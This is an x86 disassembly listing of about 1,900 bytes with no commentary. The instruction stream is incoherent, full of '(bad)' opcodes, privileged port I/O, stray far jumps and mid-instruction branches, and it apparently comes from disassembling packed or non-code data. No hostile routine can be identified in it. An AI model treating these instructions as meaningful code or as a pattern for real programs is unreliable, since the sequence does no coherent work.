  42446e:	and    BYTE PTR [esi-0x23],ch
  424471:	inc    ebx
  424472:	(bad)  
  424473:	xchg   ebp,eax
  424474:	push   esi
  424475:	ror    DWORD PTR [edi-0x42744436],0x25
  42447c:	retf   0x77c2
  42447f:	sbb    al,0x1a
  424481:	imul   DWORD PTR [esi+0x74cb7537]
  424487:	mov    DWORD PTR [eax],ebx
  424489:	out    0x21,eax
  42448b:	mov    esi,0xe882917a
  424490:	add    al,0x76
  424492:	je     0x42450b
  424494:	and    bh,ah
  424496:	pop    es
  424497:	adc    al,0x16
  424499:	cmp    esi,DWORD PTR [eax]
  42449b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42449c:	add    esp,DWORD PTR [ebx-0x6f8cf08e]
  4244a2:	cmp    dh,al
  4244a4:	es pushf 
  4244a6:	cmp    eax,0x2dcd37cf
  4244ab:	lods   al,BYTE PTR ds:[esi]
  4244ac:	and    eax,0xca3408ae
  4244b1:	rol    BYTE PTR ds:0xad263757,1
  4244b7:	aaa    
  4244b8:	icebp  
  4244b9:	mov    bh,0x73
  4244bb:	or     dh,BYTE PTR [edx+edi*2-0x57f1fe2c]
  4244c2:	adc    DWORD PTR [ebx],esp
  4244c4:	mov    bl,0xcd
  4244c6:	mov    ch,0x20
  4244c8:	aam    0xfe
  4244ca:	dec    esp
  4244cb:	adc    esi,DWORD PTR [ecx]
  4244cd:	push   cs
  4244ce:	xor    BYTE PTR [esi+0x6e],dh
  4244d1:	adc    eax,0x4691ea27
  4244d6:	ins    BYTE PTR es:[edi],dx
  4244d7:	(bad)  
  4244d9:	sub    BYTE PTR [edx],bl
  4244db:	jp     0x4244d6
  4244dd:	push   ebx
  4244de:	scas   al,BYTE PTR es:[edi]
  4244df:	jno    0x42448f
  4244e1:	in     eax,0x79
  4244e3:	das    
  4244e4:	in     eax,0xac
  4244e6:	dec    esp
  4244e7:	int3   
  4244e8:	popa   
  4244e9:	inc    ecx
  4244ea:	jnp    0x4244f6
  4244ec:	rol    DWORD PTR [ebx],0x9f
  4244ef:	test   eax,0x611b0b76
  4244f4:	pop    edx
  4244f5:	fisubr WORD PTR [esi]
  4244f7:	mov    ebp,0x262658fe
  4244fc:	or     eax,0x946cb88
  424501:	js     0x4244e2
  424503:	inc    BYTE PTR [esi]
  424505:	push   ebx
  424506:	inc    edx
  424507:	arpl   WORD PTR [ecx+eax*8+0x2aee1e52],bp
  42450e:	add    ch,bh
  424510:	sbb    BYTE PTR [esi],bh
  424512:	xchg   DWORD PTR [ecx],ebx
  424514:	in     eax,dx
  424515:	pusha  
  424516:	and    BYTE PTR [eax],dh
  424518:	sbb    al,0x5a
  42451a:	fwait
  42451b:	inc    edx
  42451c:	dec    eax
  42451d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42451e:	jnp    0x424533
  424520:	sub    BYTE PTR [ebp+0xd],dl
  424523:	mov    ah,0x6f
  424525:	neg    DWORD PTR [ebx-0x55]
  424528:	and    ch,BYTE PTR [edx+ecx*1+0x5d]
  42452c:	adc    DWORD PTR [eax+esi*4-0x552bb0c9],esp
  424533:	pop    es
  424534:	test   esp,ecx
  424536:	fist   WORD PTR [eax]
  424538:	int3   
  424539:	lahf   
  42453a:	into   
  42453b:	and    DWORD PTR [ecx-0x4d],ebx
  42453e:	xor    BYTE PTR [eax-0x7e],dl
  424541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424542:	mov    cl,0xce
  424544:	mov    BYTE PTR [edi],0x34
  424547:	cdq    
  424548:	imul   ecx,DWORD PTR [esi-0x1e],0x7c
  42454c:	(bad)  
  42454d:	pop    ecx
  42454e:	inc    esi
  42454f:	(bad)  
  424550:	mov    BYTE PTR [ebx+0x4e7a4e40],cl
  424556:	iret   
  424557:	cmp    al,0x63
  424559:	dec    ecx
  42455a:	jge    0x424536
  42455c:	sbb    bl,BYTE PTR [edx]
  42455e:	add    edx,DWORD PTR [ecx+0x4399f0b]
  424564:	adc    bl,BYTE PTR [edx]
  424566:	push   es
  424567:	jae    0x424597
  424569:	cmp    eax,0x3c88c95
  42456e:	ins    DWORD PTR es:[edi],dx
  42456f:	mov    edi,0x6542003d
  424574:	nop
  424575:	fimul  WORD PTR [ecx+edx*4+0x772beaa6]
  42457c:	call   0x731:0xe16f34ac
  424583:	mov    al,ds:0x81d41ec
  424588:	dec    edi
  424589:	lods   eax,DWORD PTR ds:[esi]
  42458a:	test   BYTE PTR ds:0x9c82818c,bh
  424590:	mov    eax,0xdfcd3b5a
  424595:	and    BYTE PTR [ebx-0x20],bl
  424598:	out    dx,eax
  424599:	push   edx
  42459a:	add    BYTE PTR [eax],al
  42459c:	push   esp
  42459d:	ds and al,0x19
  4245a0:	outs   dx,BYTE PTR ds:[esi]
  4245a1:	sbb    edi,DWORD PTR [ebp+0x7f]
  4245a4:	(bad)  
  4245a5:	mov    eax,0xa4e7cfc0
  4245aa:	leave  
  4245ab:	icebp  
  4245ac:	push   esi
  4245ad:	mov    edi,0x2860001
  4245b2:	add    BYTE PTR [eax],al
  4245b4:	cmc    
  4245b5:	xor    esi,DWORD PTR [ebx]
  4245b7:	sub    DWORD PTR [edx+0x5fe3da2f],ecx
  4245bd:	add    ah,BYTE PTR [eax]
  4245bf:	aam    0x60
  4245c1:	popf   
  4245c2:	leave  
  4245c3:	aaa    
  4245c4:	fisub  DWORD PTR ds:0x89defa9b
  4245ca:	rcl    DWORD PTR [edi-0x461ad46c],cl
  4245d0:	enter  0xfdcb,0x7f
  4245d4:	or     DWORD PTR [ecx+ecx*1-0x196b9233],eax
  4245db:	cli    
  4245dc:	sbb    BYTE PTR [ecx],dh
  4245de:	xor    al,0x78
  4245e0:	scas   eax,DWORD PTR es:[edi]
  4245e1:	xor    DWORD PTR [ebx-0x4a],0x17c3dda4
  4245e8:	jg     0x42458f
  4245ea:	mov    dl,0x7c
  4245ec:	jns    0x424634
  4245ee:	in     al,0xa3
  4245f0:	sub    bl,BYTE PTR [esi-0x77]
  4245f3:	and    eax,0xc02f5615
  4245f8:	push   esp
  4245f9:	fadd   QWORD PTR ds:0x7ffbd533
  4245ff:	mul    DWORD PTR [ebx+ebx*4-0x541495c7]
  424606:	out    0x53,eax
  424608:	xor    ebp,ebp
  42460a:	lods   eax,DWORD PTR ds:[esi]
  42460b:	push   edx
  42460c:	cwde   
  42460d:	xlat   BYTE PTR ds:[ebx]
  42460e:	mov    dl,BYTE PTR [ebx]
  424610:	dec    ebp
  424611:	pop    ecx
  424612:	(bad)  
  424613:	jbe    0x4245f9
  424615:	js     0x424674
  424617:	stos   BYTE PTR es:[edi],al
  424618:	bound  edx,QWORD PTR [ecx-0x34]
  42461b:	xchg   esp,eax
  42461c:	mov    ch,0xf5
  42461e:	test   esi,ebx
  424620:	pushf  
  424621:	adc    dl,0x2c
  424624:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  424626:	stos   BYTE PTR es:[edi],al
  424627:	or     al,0x6b
  424629:	and    eax,DWORD PTR [ebx]
  42462b:	jns    0x4245ee
  42462d:	dec    ecx
  42462e:	jne    0x424623
  424630:	mov    bl,0xed
  424632:	lock and DWORD PTR [edx+0x4b4a20cc],0xffffff82
  42463a:	inc    eax
  42463b:	push   ebx
  42463c:	jb     0x424622
  42463e:	jmp    0xe0b3:0x624d3174
  424645:	test   al,0x47
  424647:	push   ebp
  424648:	mov    dh,dl
  42464a:	mov    edx,0x8c8c9968
  42464f:	ret    
  424650:	in     eax,0xf0
  424652:	(bad)  
  424653:	gs ret 
  424655:	lds    edi,FWORD PTR [eax]
  424657:	sbb    esp,DWORD PTR [edx-0x5475849d]
  42465d:	div    ebx
  42465f:	in     al,0x3a
  424661:	mov    ds:0xcbba0a0f,al
  424666:	jae    0x42466d
  424668:	stos   BYTE PTR es:[edi],al
  424669:	pop    esp
  42466a:	inc    eax
  42466b:	mov    ch,0x9a
  42466d:	inc    esi
  42466e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42466f:	icebp  
  424670:	hlt    
  424671:	sti    
  424672:	lods   eax,DWORD PTR ds:[esi]
  424673:	fwait
  424674:	lods   eax,DWORD PTR ds:[esi]
  424675:	sbb    al,0xe
  424677:	repnz outs dx,BYTE PTR ds:[esi]
  424679:	or     al,0x5c
  42467b:	and    al,0xba
  42467d:	stos   BYTE PTR es:[edi],al
  42467e:	fwait
  42467f:	pop    edi
  424680:	mov    bl,0x17
  424682:	in     al,0xbc
  424684:	lods   al,BYTE PTR ds:[esi]
  424685:	jge    0x424630
  424687:	jne    0x424686
  424689:	in     al,0x92
  42468b:	mov    ah,0x68
  42468d:	push   ebx
  42468e:	xadd   DWORD PTR [ebx],eax
  424691:	jbe    0x4246e8
  424693:	aad    0x2a
  424695:	push   cs
  424696:	icebp  
  424697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424698:	jg     0x424697
  42469a:	ror    BYTE PTR [ebp+ebp*8+0x24],cl
  42469e:	pop    esi
  42469f:	jno    0x4246ad
  4246a1:	inc    ecx
  4246a2:	push   ss
  4246a3:	sbb    esp,edx
  4246a5:	mov    esi,DWORD PTR [eax+edi*8-0x12]
  4246a9:	scas   eax,DWORD PTR es:[edi]
  4246aa:	sub    eax,0x77160dad
  4246af:	(bad)  
  4246b0:	lods   eax,DWORD PTR ds:[esi]
  4246b1:	dec    edi
  4246b2:	mov    edi,0x3f68c310
  4246b7:	xchg   esp,eax
  4246b8:	sub    DWORD PTR [ebx],edi
  4246ba:	jge    0x424691
  4246bc:	jmp    0x424713
  4246be:	inc    dx
  4246c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4246c1:	jp     0x42467e
  4246c3:	fwait
  4246c4:	les    ecx,FWORD PTR [eax]
  4246c6:	retf   0xc09b
  4246c9:	sub    esi,DWORD PTR ds:0x491a9f1
  4246cf:	in     al,0x90
  4246d1:	fwait
  4246d2:	or     ebp,DWORD PTR [ecx-0x65]
  4246d5:	xor    DWORD PTR [eax-0x45],ebp
  4246d8:	mov    esp,DWORD PTR [ebp-0x1a5faf77]
  4246de:	data16 jecxz 0x424713
  4246e1:	mov    ds:0xd253b98f,al
  4246e6:	add    eax,0x59aa070c
  4246eb:	xchg   DWORD PTR [ecx+ecx*1-0xb],eax
  4246ef:	outs   dx,BYTE PTR ds:[esi]
  4246f0:	dec    ebp
  4246f1:	popf   
  4246f2:	dec    ecx
  4246f3:	push   esp
  4246f4:	dec    eax
  4246f5:	fstp   TBYTE PTR [edx-0x4]
  4246f8:	push   ss
  4246f9:	call   0x1867:0x78f9f3da
  424700:	enter  0x755c,0x8b
  424704:	mov    esp,0x1e2a8eb9
  424709:	adc    ah,BYTE PTR [eax-0x7f6bea45]
  42470f:	or     ch,BYTE PTR [ebp+eax*1-0x4b]
  424713:	mov    ecx,DWORD PTR [ecx+0x34f2bb0a]
  424719:	push   cs
  42471a:	or     DWORD PTR [ebp-0x4b],ebx
  42471d:	sub    eax,0xaa0099c4
  424722:	sbb    bh,ch
  424724:	stos   DWORD PTR es:[edi],eax
  424725:	(bad)  
  424727:	(bad)  
  424728:	sub    eax,0x541cc3f5
  42472d:	jg     0x42476c
  42472f:	jl     0x42477f
  424731:	jmp    0xc0e0d7bd
  424736:	xor    eax,0x3feb2901
  42473b:	rcr    DWORD PTR [ebx+0x5f2563aa],cl
  424741:	and    al,0x94
  424743:	or     eax,0xc556f431
  424748:	push   ebx
  424749:	adc    BYTE PTR [esi-0x7b9ce79e],cl
  42474f:	inc    ebp
  424750:	cmp    al,0xbc
  424752:	push   ebx
  424753:	bound  ecx,QWORD PTR [ebp-0x1abcfe4]
  424759:	push   0x3a6fff13
  42475e:	gs rcl ebp,1
  424761:	cwde   
  424762:	pushf  
  424763:	leave  
  424764:	fidivr DWORD PTR [edi+0x1e]
  424767:	(bad)  
  424769:	stos   BYTE PTR es:[edi],al
  42476a:	addr16 sub eax,0xf007b362
  424770:	pop    edx
  424771:	cmc    
  424772:	sub    DWORD PTR [ebp+0x1dc58694],ebp
  424778:	lods   eax,DWORD PTR ds:[esi]
  424779:	fs stos DWORD PTR es:[edi],eax
  42477b:	fs inc esp
  42477d:	cwde   
  42477e:	popf   
  42477f:	loope  0x42472c
  424781:	repnz out dx,al
  424783:	sub    esi,DWORD PTR [ebx]
  424785:	fild   WORD PTR [ebx]
  424787:	jmp    DWORD PTR [ecx]
  424789:	sub    DWORD PTR [esi+0x21],eax
  42478c:	loope  0x424780
  42478e:	adc    BYTE PTR [eax],ah
  424790:	push   es
  424791:	leave  
  424792:	xor    al,dl
  424794:	push   0x3b
  424796:	mov    cl,bl
  424798:	mov    ah,0x70
  42479a:	ins    BYTE PTR es:[edi],dx
  42479b:	lods   al,BYTE PTR ds:[esi]
  42479c:	ror    DWORD PTR [ebp-0x1],0x22
  4247a0:	mov    al,ds:0x2dd8c1be
  4247a5:	jne    0x4247a7
  4247a7:	je     0x424732
  4247a9:	sbb    al,0xb0
  4247ab:	push   ds
  4247ac:	sbb    edi,DWORD PTR [esi]
  4247ae:	or     esp,ebx
  4247b0:	xchg   ebx,eax
  4247b1:	dec    ebp
  4247b2:	sbb    BYTE PTR [eax-0x70d42733],bh
  4247b8:	lahf   
  4247b9:	push   eax
  4247ba:	popa   
  4247bb:	cmp    eax,0x2653fd4a
  4247c0:	and    DWORD PTR [ecx],ebp
  4247c2:	or     ebx,DWORD PTR [ebp+0x3d]
  4247c5:	(bad)  
  4247c6:	outs   dx,DWORD PTR ds:[esi]
  4247c7:	jge    0x4247ae
  4247c9:	cmp    al,BYTE PTR [esp+ebp*4+0x79]
  4247cd:	xlat   BYTE PTR ds:[ebx]
  4247ce:	inc    ecx
  4247cf:	xchg   esp,eax
  4247d0:	xor    al,0xeb
  4247d2:	lock nop
  4247d4:	ja     0x42475c
  4247d6:	xchg   ebp,eax
  4247d7:	xchg   edi,eax
  4247d8:	jne    0x424802
  4247da:	cmp    al,0xaf
  4247dc:	sbb    bl,bl
  4247de:	retf   
  4247df:	repz test BYTE PTR [esi+edx*8],ah
  4247e3:	cmp    BYTE PTR [ebp+0x2a],dl
  4247e6:	pop    DWORD PTR [edi+eax*8-0x26c9b646]
  4247ed:	and    al,0x10
  4247ef:	(bad)  
  4247f0:	sub    BYTE PTR [ebx],ah
  4247f2:	rcl    DWORD PTR [ebp-0x55],1
  4247f5:	pop    ss
  4247f6:	jns    0x42480b
  4247f8:	and    eax,0x5daf7f2e
  4247fd:	int3   
  4247fe:	lds    eax,FWORD PTR [esi]
  424800:	fidiv  DWORD PTR [eax-0x7226e29b]
  424806:	test   BYTE PTR [edi],dl
  424808:	push   ecx
  424809:	mov    esp,0xc5a67a2a
  42480e:	aad    0xb4
  424810:	pop    ds
  424811:	sbb    al,0x5b
  424813:	out    dx,eax
  424814:	cmp    BYTE PTR [eax+0x31],al
  424817:	pop    eax
  424818:	push   es
  424819:	(bad)  
  42481a:	mov    eax,ds:0x8e335bd2
  42481f:	xchg   edx,eax
  424820:	cld    
  424821:	(bad)  
  424822:	push   edi
  424823:	or     al,BYTE PTR [esi-0x31]
  424826:	les    eax,FWORD PTR [edx-0x2f]
  424829:	les    ebx,FWORD PTR [esi]
  42482b:	mov    dl,0xa4
  42482d:	push   ebp
  42482e:	pop    ss
  42482f:	ins    DWORD PTR es:[edi],dx
  424830:	xchg   BYTE PTR [ecx],dh
  424832:	pop    edx
  424833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424834:	(bad)  
  424835:	cmp    eax,0x7982058d
  42483a:	add    BYTE PTR [eax],al
  42483c:	mov    esi,0x74ef74ea
  424841:	(bad)  
  424842:	mov    edi,0x98b349fb
  424847:	xor    bl,BYTE PTR [ebx-0x23ca01da]
  42484d:	rol    DWORD PTR [ecx],0x0
  424850:	xchg   BYTE PTR [edx],al
  424852:	add    BYTE PTR [eax],al
  424854:	out    0x6b,al
  424856:	test   al,0x2e
  424858:	je     0x424856
  42485a:	daa    
  42485b:	add    ecx,esi
  42485d:	pop    ebx
  42485e:	pop    esp
  42485f:	jle    0x424826
  424861:	lock adc al,dl
  424864:	cwde   
  424865:	pop    esi
  424866:	cmp    eax,DWORD PTR [ecx]
  424868:	inc    ecx
  424869:	xchg   edx,eax
  42486a:	xchg   edx,eax
  42486b:	add    DWORD PTR [edi+esi*2+0x34db67d4],ebx
  424872:	loop   0x424855
  424874:	adc    BYTE PTR [eax],0xe7
  424877:	mov    ah,0xf1
  424879:	add    ebx,DWORD PTR [esi]
  42487b:	mov    ds:0x392dcf1a,eax
  424880:	dec    eax
  424881:	sti    
  424882:	add    esi,DWORD PTR [esi+0x4a]
  424885:	push   esp
  424886:	jae    0x4248eb
  424888:	loope  0x4248aa
  42488a:	mov    BYTE PTR [eax],ah
  42488c:	sub    BYTE PTR [esi-0x4db0b134],cl
  424892:	sub    al,0xf1
  424894:	jl     0x42489b
  424896:	mov    edx,esi
  424898:	sub    BYTE PTR [eax+0x32],0x32
  42489c:	leave  
  42489d:	in     al,dx
  42489e:	push   esi
  42489f:	fist   WORD PTR [edx+0x4369c514]
  4248a5:	call   0xd9c3:0xae667858
  4248ac:	bound  esi,QWORD PTR [ebx-0x7ce97fdc]
  4248b2:	jnp    0x4248a8
  4248b4:	mov    eax,edi
  4248b6:	lock aad 0xe6
  4248b9:	xchg   esp,eax
  4248ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248bb:	mov    al,ds:0xc398e7cc
  4248c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4248c1:	cdq    
  4248c2:	xchg   ebp,eax
  4248c3:	cmp    bl,BYTE PTR [edx+0x45]
  4248c6:	push   ebp
  4248c7:	pop    ss
  4248c8:	ror    BYTE PTR [edi-0x5de4997a],1
  4248ce:	ja     0x4248ba
  4248d0:	dec    edx
  4248d1:	leave  
  4248d2:	(bad)  
  4248d3:	(bad)  
  4248d4:	loop   0x4248ef
  4248d6:	int    0x16
  4248d8:	(bad)  
  4248d9:	pop    ds
  4248da:	adc    edx,ebx
  4248dc:	xchg   ebp,eax
  4248dd:	xor    eax,0xe355b753
  4248e2:	mov    ds:0xff26387,al
  4248e7:	(bad)  
  4248e9:	mov    dh,0x53
  4248eb:	push   ebx
  4248ec:	(bad)  
  4248ed:	in     al,0x13
  4248ef:	or     BYTE PTR [edx+0x78a9bfa9],0x4f
  4248f6:	sahf   
  4248f7:	sbb    al,0x6b
  4248f9:	jnp    0x424975
  4248fb:	mov    ebp,0xa8f8fd74
  424900:	jb     0x4248ef
  424902:	loopne 0x4248d8
  424904:	push   esi
  424905:	xchg   ebp,eax
  424906:	shr    DWORD PTR [ebx],cl
  424908:	push   ebp
  424909:	out    dx,eax
  42490a:	inc    eax
  42490b:	mov    edx,0xe2515811
  424910:	popf   
  424911:	in     al,dx
  424912:	mov    bh,0xfd
  424914:	fs add al,0x9a
  424917:	and    BYTE PTR ds:0x8fa79bbf,0x6a
  42491e:	or     BYTE PTR [ecx+esi*4+0x31],bl
  424922:	mov    eax,0x98c94cb2
  424927:	inc    eax
  424928:	inc    eax
  424929:	cmp    al,0x72
  42492b:	xor    esi,DWORD PTR [edx+0x251d67d8]
  424931:	mov    esp,0x20b8afbc
  424936:	jns    0x424917
  424938:	or     bl,BYTE PTR [edx+ebx*2]
  42493b:	dec    ecx
  42493c:	push   ebx
  42493d:	push   cs
  42493e:	xchg   esi,eax
  42493f:	jbe    0x424902
  424941:	jg     0x424979
  424943:	adc    eax,0xdd11f7a5
  424948:	inc    edx
  424949:	mov    ch,0xd8
  42494b:	jae    0x4249b3
  42494d:	std    
  42494e:	mov    ebp,0x1f0af6c3
  424953:	imul   ecx,DWORD PTR [esi],0xffffff99
  424956:	jmp    0xdd6e:0x836ef436
  42495d:	jne    0x424946
  42495f:	xor    BYTE PTR [eax+0x4b5bc546],cl
  424965:	sbb    ecx,DWORD PTR [esi-0x7387b2d8]
  42496b:	mov    bh,0xf1
  42496d:	cmp    ebx,ebx
  42496f:	sbb    al,0x0
  424971:	adc    al,BYTE PTR [edx+0x96e3d61]
  424977:	add    DWORD PTR [edx-0x36820d0],edi
  42497d:	pop    ecx
  42497e:	call   0x389f:0x8cfeddf4
  424985:	cmp    al,BYTE PTR [edx+0x32]
  424988:	dec    esi
  424989:	xor    dh,dl
  42498b:	mov    BYTE PTR [ecx],dl
  42498d:	push   0xffffffc3
  42498f:	aaa    
  424990:	inc    eax
  424991:	(bad)  
  424992:	dec    DWORD PTR [ecx+eiz*8-0x66]
  424996:	shl    DWORD PTR [ebx-0x2b],cl
  424999:	lods   al,BYTE PTR ds:[esi]
  42499a:	pop    ss
  42499b:	and    eax,0xdcea562
  4249a0:	aaa    
  4249a1:	pop    es
  4249a2:	das    
  4249a3:	iret   
  4249a4:	push   esp
  4249a5:	and    eax,DWORD PTR [ebp+0x91fa67b]
  4249ab:	cld    
  4249ac:	fcmovne st,st(0)
  4249ae:	mov    ch,bh
  4249b0:	enter  0x980d,0x46
  4249b4:	mov    ebp,0x7bfe82fd
  4249b9:	shl    DWORD PTR [ecx-0x19],cl
  4249bc:	mov    al,0xf2
  4249be:	je     0x4249c7
  4249c0:	out    dx,al
  4249c1:	lods   eax,DWORD PTR ds:[esi]
  4249c2:	fs jle 0x424a3c
  4249c5:	xor    al,0x40
  4249c7:	ins    BYTE PTR es:[edi],dx
  4249c8:	or     esi,eax
  4249ca:	mov    BYTE PTR [ebx+0x35],bh
  4249cd:	pop    ebx
  4249ce:	mov    cl,BYTE PTR [edx+0x2d]
  4249d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4249d2:	fs dec ecx
  4249d4:	or     al,0x5b
  4249d6:	and    eax,0xd697554c
  4249db:	test   DWORD PTR [eax-0x5a],edx
  4249de:	jo     0x424a28
  4249e0:	(bad)  
  4249e1:	out    dx,al
  4249e2:	scas   eax,DWORD PTR es:[edi]
  4249e3:	add    bh,0xb
  4249e6:	aas    
  4249e7:	jae    0x424a45
  4249e9:	test   BYTE PTR [ecx+ebx*2-0x797097c0],ah
  4249f0:	mov    edi,0x889c36af
  4249f5:	jmp    0x9ec392b7
  4249fa:	sub    al,0xee
  4249fc:	jo     0x424a6f
  4249fe:	hlt    
  4249ff:	rcr    BYTE PTR [edx],cl
  424a01:	es cwde 
  424a03:	in     eax,dx
  424a04:	in     al,dx
  424a05:	out    dx,al
  424a06:	out    dx,eax
  424a07:	push   esp
  424a08:	hlt    
  424a09:	mov    al,ds:0xef1eb133
  424a0e:	cs push ss
  424a10:	sub    BYTE PTR [eax],bl
  424a12:	lahf   
  424a13:	xlat   BYTE PTR ds:[ebx]
  424a14:	inc    esp
  424a15:	arpl   WORD PTR [ecx],bp
  424a17:	out    0x22,al
  424a19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a1a:	cmc    
  424a1b:	or     DWORD PTR [ecx+0x28],ebx
  424a1e:	inc    eax
  424a1f:	push   edi
  424a20:	test   BYTE PTR [ebx-0x56da685a],dh
  424a26:	dec    esp
  424a27:	lahf   
  424a28:	out    0xfe,eax
  424a2a:	aad    0x36
  424a2c:	ficom  DWORD PTR ss:0xf48a261f
  424a33:	xchg   edx,eax
  424a34:	pusha  
  424a35:	pop    ds
  424a36:	or     al,0x3
  424a38:	cs stc 
  424a3a:	dec    ecx
  424a3b:	add    al,0x44
  424a3d:	dec    ebx
  424a3e:	dec    ebp
  424a3f:	lock push es
  424a41:	stos   BYTE PTR es:[edi],al
  424a42:	ja     0x424a04
  424a44:	ss pop esp
  424a46:	cmp    al,0x9a
  424a48:	pmaxsw mm3,mm5
  424a4b:	sbb    ch,BYTE PTR [ecx-0x2a]
  424a4e:	outs   dx,BYTE PTR ds:[esi]
  424a4f:	pop    edi
  424a50:	xchg   esp,eax
  424a51:	adc    BYTE PTR [ebx-0x65616e14],dh
  424a57:	cmp    BYTE PTR [eax],0xc4
  424a5a:	push   esp
  424a5b:	mov    al,ds:0x3068ad62
  424a60:	jno    0x424a46
  424a62:	push   eax
  424a63:	fldenv ds:0x9b876f4c
  424a69:	mov    ecx,0xbfe6bc86
  424a6e:	or     ch,BYTE PTR [edx+eax*8+0x40]
  424a72:	jne    0x424ac7
  424a74:	xor    edx,esi
  424a76:	leave  
  424a77:	retf   
  424a78:	xor    DWORD PTR [edx-0x7ebe148a],ebp
  424a7e:	pop    ss
  424a7f:	xor    bh,BYTE PTR [ebp-0x39]
  424a82:	dec    edi
  424a83:	push   ecx
  424a84:	fmul   DWORD PTR [ecx-0x5]
  424a87:	lods   al,BYTE PTR ds:[esi]
  424a88:	fstp   TBYTE PTR [edi+0x20722671]
  424a8e:	add    DWORD PTR [eax-0x7c69c30a],0xffffff9f
  424a95:	push   es
  424a96:	push   ecx
  424a97:	jmp    0xdd9:0x2872430e
  424a9e:	mov    al,0x33
  424aa0:	(bad)  
  424aa1:	dec    ebx
  424aa2:	hlt    
  424aa3:	retf   0x8363
  424aa6:	add    ah,BYTE PTR [eax-0x5c]
  424aa9:	and    al,0xd5
  424aab:	xchg   esp,eax
  424aac:	pop    eax
  424aad:	mov    esi,DWORD PTR [ecx-0x3304109f]
  424ab3:	xor    al,BYTE PTR [ebx-0x7a]
  424ab6:	add    DWORD PTR [ebp+0x65779e79],ecx
  424abc:	cli    
  424abd:	ins    DWORD PTR es:[edi],dx
  424abe:	enter  0xef7e,0xbe
  424ac2:	scas   eax,DWORD PTR es:[edi]
  424ac3:	setnp  BYTE PTR [ebx-0x2a]
  424ac7:	sub    BYTE PTR [ecx+0x17],ah
  424aca:	lock nop
  424acc:	adc    BYTE PTR [ebx],ch
  424ace:	mov    ds:0x8f1ac1f0,eax
  424ad3:	push   0xffffffba
  424ad5:	cmp    ah,BYTE PTR [ebx+0xc6604e]
  424adb:	add    BYTE PTR [ebx+0x45],cl
  424ade:	mov    edx,0x5fffbeee
  424ae3:	in     eax,0x54
  424ae5:	stos   BYTE PTR es:[edi],al
  424ae6:	clc    
  424ae7:	adc    edi,ebp
  424ae9:	popa   
  424aea:	stos   WORD PTR es:[edi],ax
  424aec:	(bad)  
  424aed:	les    eax,FWORD PTR [ecx]
  424aef:	add    BYTE PTR [esi+0x73000002],al
  424af5:	je     0x424a9a
  424af7:	jmp    0x424a98
  424af9:	push   esi
  424afa:	mov    ah,0xe
  424afc:	pop    ebp
  424afd:	xchg   esp,eax
  424afe:	sbb    DWORD PTR [edx+0x591008cf],ebp
  424b04:	iret   
  424b05:	mov    ds:0x72476c66,al
  424b0a:	mov    ds:0x750d382d,eax
  424b0f:	ins    DWORD PTR es:[edi],dx
  424b10:	sahf   
  424b11:	xchg   esp,eax
  424b12:	stos   BYTE PTR es:[edi],al
  424b13:	test   BYTE PTR [ebp+0x16ad8b10],cl
  424b19:	or     al,0xf6
  424b1b:	and    DWORD PTR [eax+0x10605d9e],ecx
  424b21:	ficom  DWORD PTR [eax+eiz*2+0x63]
  424b25:	xchg   edx,eax
  424b26:	inc    esp
  424b27:	mov    edi,0xad5be985
  424b2c:	test   eax,0xfd610e06
  424b31:	lock pop ss
  424b33:	fisttp DWORD PTR [eax+0x3]
  424b36:	in     eax,0xa9
  424b38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b39:	jmp    DWORD PTR [ecx+0x74e58e9f]
  424b3f:	std    
  424b40:	inc    eax
  424b41:	mov    ebp,edx
  424b43:	cmp    al,0x80
  424b45:	xor    edx,DWORD PTR [edi+0x327ce32]
  424b4b:	fcmovne st,st(5)
  424b4d:	shl    BYTE PTR [ebx-0x3638484c],1
  424b53:	dec    ecx
  424b54:	xchg   esi,eax
  424b55:	or     DWORD PTR ds:0x6a6cdfdb,esi
  424b5b:	daa    
  424b5c:	xor    BYTE PTR [esi],ah
  424b5e:	loopne 0x424b89
  424b60:	push   edx
  424b61:	rcl    BYTE PTR [ebp+0x53],0x50
  424b65:	and    al,0xbe
  424b67:	or     eax,0xd9687b3f
  424b6c:	and    ecx,esp
  424b6e:	jg     0x424b9a
  424b70:	out    0xe9,al
  424b72:	je     0x424ba8
  424b74:	mov    al,ds:0x146475fc
  424b79:	gs ffree st(6)
  424b7c:	stos   BYTE PTR es:[edi],al
  424b7d:	call   0x5253:0x31355623
  424b84:	sbb    ah,BYTE PTR [ecx]
  424b86:	fild   WORD PTR [ebp+0xea6bd3f]
  424b8c:	adc    DWORD PTR [ecx-0x722433cb],esi
  424b92:	hlt    
  424b93:	push   eax
  424b94:	sub    eax,0x20d8086a
  424b99:	loop   0x424b3c
  424b9b:	xlat   BYTE PTR ds:[ebx]
  424b9c:	ret    
  424b9d:	sub    cl,BYTE PTR [edx-0x56965f18]
  424ba3:	jb     0x424c0c
  424ba5:	ins    DWORD PTR es:[edi],dx
  424ba6:	jmp    0xd180cd51
  424bab:	mov    bh,0x24
  424bad:	mov    dh,0xb3
  424baf:	xlat   BYTE PTR ds:[ebx]
  424bb0:	icebp  
  424bb1:	sub    bh,BYTE PTR [edi]
  424bb3:	shr    BYTE PTR [edx],0x95
  424bb6:	cmp    cl,ah
  424bb8:	popf   
  424bb9:	sbb    al,0xc6
  424bbb:	mov    ch,0x6d
  424bbd:	push   ds
  424bbe:	xor    BYTE PTR [edx],ah
  424bc0:	mov    ds:0x4e825f18,eax
  424bc5:	stos   DWORD PTR es:[edi],eax
  424bc6:	pop    es
  424bc7:	icebp  
  424bc8:	aam    0x48
  424bca:	pop    ebp
  424bcb:	inc    ebp
  424bcc:	and    al,0xef
  424bce:	lods   eax,DWORD PTR ds:[esi]
  424bcf:	sbb    al,0xdb
  424bd1:	cld    
  424bd2:	in     eax,dx
  424bd3:	(bad)  
  424bd4:	and    DWORD PTR [eax],esi
  424bd6:	add    eax,0x1a21deb7
  424bdb:	push   eax
